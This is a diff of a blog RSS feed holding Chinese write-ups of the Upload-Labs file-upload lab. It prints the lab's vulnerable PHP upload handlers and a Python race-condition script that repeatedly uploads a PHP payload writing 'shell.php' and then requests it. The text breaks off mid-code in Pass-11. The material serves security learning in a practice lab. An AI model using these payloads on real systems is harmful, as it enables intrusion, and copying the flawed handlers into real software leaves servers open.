@@ -1,7 +1,220 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>文件上传漏洞 - 标签 - Braindance</title><link>https://www.braindance.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</link><description>文件上传漏洞 - 标签 - Braindance</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Thu, 19 Nov 2020 08:47:19 +0800</lastBuildDate><atom:link href="https://www.braindance.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="self" type="application/rss+xml"/><item><title>Upload-Labs的最后几道题</title><link>https://www.braindance.top/posts/ctf/upload-labs5/</link><pubDate>Thu, 19 Nov 2020 08:47:19 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/upload-labs5/</guid><description><![CDATA[<h2 id="pass-17" class="headerLink">
-    <a href="#pass-17" class="header-mark"></a>Pass-17</h2><p>​	（windows环境，php版本5.2.17，题号是18题）</p>]]></description></item><item><title>Upload-Labs之Pass-16</title><link>https://www.braindance.top/posts/ctf/upload-labs4/</link><pubDate>Mon, 16 Nov 2020 22:50:25 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/upload-labs4/</guid><description><![CDATA[<h2 id="前言" class="headerLink">
-    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h2><p>​	我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。</p>]]></description></item><item><title>Upload-Labs(三)</title><link>https://www.braindance.top/posts/ctf/upload-labs3/</link><pubDate>Mon, 16 Nov 2020 16:04:30 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/upload-labs3/</guid><description><![CDATA[<h2 id="前言" class="headerLink">
-    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h2><p>​	继续接着上一次的<code>Upload-labs</code>往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。</p>]]></description></item><item><title>Upload-Labs(二)</title><link>https://www.braindance.top/posts/ctf/upload-labs2/</link><pubDate>Mon, 09 Nov 2020 20:12:27 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/upload-labs2/</guid><description><![CDATA[<h2 id="前言" class="headerLink">
-    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h2><p>​	这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。</p>]]></description></item><item><title>Upload-Labs(一)</title><link>https://www.braindance.top/posts/ctf/upload-labs1/</link><pubDate>Sun, 08 Nov 2020 19:23:16 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/upload-labs1/</guid><description><![CDATA[<h2 id="介绍" class="headerLink">
-    <a href="#%e4%bb%8b%e7%bb%8d" class="header-mark"></a>介绍</h2><blockquote>
-<p>大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。</p>]]></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>文件上传漏洞 on</title><link>/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</link><description>Recent content in 文件上传漏洞 on</description><generator>Hugo</generator><language>en</language><lastBuildDate>Thu, 19 Nov 2020 08:47:19 +0000</lastBuildDate><atom:link href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml"/><item><title>Upload-Labs的最后几道题</title><link>/posts/ctf/upload-labs5/</link><pubDate>Thu, 19 Nov 2020 08:47:19 +0000</pubDate><guid>/posts/ctf/upload-labs5/</guid><description>&lt;h2 id="pass-17">Pass-17&lt;/h2>
+&lt;p>​	（windows环境，php版本5.2.17，题号是18题）&lt;/p>
+&lt;p>源码：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ext_arr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;jpg&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;png&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;gif&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_name &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_ext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>($file_name,&lt;span style="color:#a6e22e">strrpos&lt;/span>($file_name,&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $upload_file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $file_name;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file, $upload_file)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">in_array&lt;/span>($file_ext,$ext_arr)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#a6e22e">rand&lt;/span>(&lt;span style="color:#ae81ff">10&lt;/span>, &lt;span style="color:#ae81ff">99&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">date&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;YmdHis&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$file_ext;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">rename&lt;/span>($upload_file, $img_path);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">unlink&lt;/span>($upload_file);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;上传出错！&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	思路和前面的一样，获取文件信息，移动文件到&lt;strong>upload&lt;/strong>文件夹，第12行使用了白名单验证，多了第14行的&lt;code>rename&lt;/code>函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了&lt;strong>上传竞争&lt;/strong>，使用&lt;code>python&lt;/code>脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码&lt;code>&amp;lt;?php fputs(fopen('shell.php','w'),'&amp;lt;?php phpinfo();?&amp;gt;');?&amp;gt;&lt;/code>这段代码执行以后，会创建一个名为&lt;code>shell.php&lt;/code>里面有一句&lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>的文件。&lt;/p>
+&lt;p>​	脚本代码&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#coding=utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> multiprocessing &lt;span style="color:#f92672">import&lt;/span> Pool
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">CompeteUpload&lt;/span>(list):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upload-labs/Pass-18/index.php&amp;#34;&lt;/span> &lt;span style="color:#75715e">#上传页面&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> geturl&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upload-labs/upload/233.php&amp;#34;&lt;/span>	 &lt;span style="color:#75715e">#访问上传文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>:(&lt;span style="color:#e6db74">&amp;#39;233.php&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php fputs(fopen(&amp;#39;shell.php&amp;#39;,&amp;#39;w&amp;#39;),&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;);?&amp;gt;&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;image/jpeg&amp;#39;&lt;/span>)}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;上传&amp;#39;&lt;/span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>post(url&lt;span style="color:#f92672">=&lt;/span>url,data&lt;span style="color:#f92672">=&lt;/span>data,files&lt;span style="color:#f92672">=&lt;/span>file)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#print &amp;#34;test upload....&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r1&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">=&lt;/span>geturl)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> r1&lt;span style="color:#f92672">.&lt;/span>status_code&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print (&lt;span style="color:#e6db74">&amp;#34;upload success!&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool &lt;span style="color:#f92672">=&lt;/span> Pool(&lt;span style="color:#ae81ff">10&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>map(CompeteUpload, range(&lt;span style="color:#ae81ff">10000&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>close()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>join()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	第一次用python的我在这里知道了&lt;code>pip&lt;/code>。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工&lt;/p></description></item><item><title>Upload-Labs之Pass-16</title><link>/posts/ctf/upload-labs4/</link><pubDate>Mon, 16 Nov 2020 22:50:25 +0000</pubDate><guid>/posts/ctf/upload-labs4/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>​	我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。&lt;/p>
+&lt;p>​	参考博客：&lt;a href="https://xz.aliyun.com/t/2657#toc-4">upload-labs之pass 16详细分析&lt;/a>&lt;/p>
+&lt;h2 id="pass-16">Pass-16&lt;/h2>
+&lt;p>​	源码（三种图片的判定，只贴一个吧，篇幅小一点）：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $filename &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $filetype &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $tmpname &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $target_path&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">basename&lt;/span>($filename);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获得上传文件的扩展名
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $fileext&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#a6e22e">strrchr&lt;/span>($filename,&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>),&lt;span style="color:#ae81ff">1&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//判断文件后缀与类型，合法才进行上传操作
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;jpg&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/jpeg&amp;#34;&lt;/span>)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($tmpname,$target_path)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//使用上传的图片生成新的图片
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $im &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">imagecreatefromjpeg&lt;/span>($target_path);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($im &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;该文件不是jpg格式的图片！&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#a6e22e">unlink&lt;/span>($target_path);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//给新图片指定文件名
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">srand&lt;/span>(&lt;span style="color:#a6e22e">time&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $newfilename &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">strval&lt;/span>(&lt;span style="color:#a6e22e">rand&lt;/span>())&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.jpg&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$newfilename;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">imagejpeg&lt;/span>($im,$img_path);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#a6e22e">unlink&lt;/span>($target_path);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;上传出错！&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;png&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/png&amp;#34;&lt;/span>)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">......&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;gif&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/gif&amp;#34;&lt;/span>)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.....&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;只允许上传后缀为.jpg|.png|.gif的图片文件！&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	提示：&lt;code>本pass重新渲染了图片！&lt;/code>。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。&lt;/p></description></item><item><title>Upload-Labs(三)</title><link>/posts/ctf/upload-labs3/</link><pubDate>Mon, 16 Nov 2020 16:04:30 +0000</pubDate><guid>/posts/ctf/upload-labs3/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>​	继续接着上一次的&lt;code>Upload-labs&lt;/code>往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。&lt;/p>
+&lt;p>​	在线靶机地址：&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://buuoj.cn/challenges#Upload-Labs-Linux">linux环境&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://buuoj.cn/challenges#%5BWindows%5DUpload-Labs-Windows">windows环境&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="pass-11">Pass-11&lt;/h2>
+&lt;p>​	(这题使用了windows环境)&lt;/p>
+&lt;p>​	源码：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ext_arr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;jpg&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;png&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;gif&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_ext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>],&lt;span style="color:#a6e22e">strrpos&lt;/span>($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>],&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">in_array&lt;/span>($file_ext,$ext_arr)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;save_path&amp;#39;&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">rand&lt;/span>(&lt;span style="color:#ae81ff">10&lt;/span>, &lt;span style="color:#ae81ff">99&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">date&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;YmdHis&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$file_ext;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
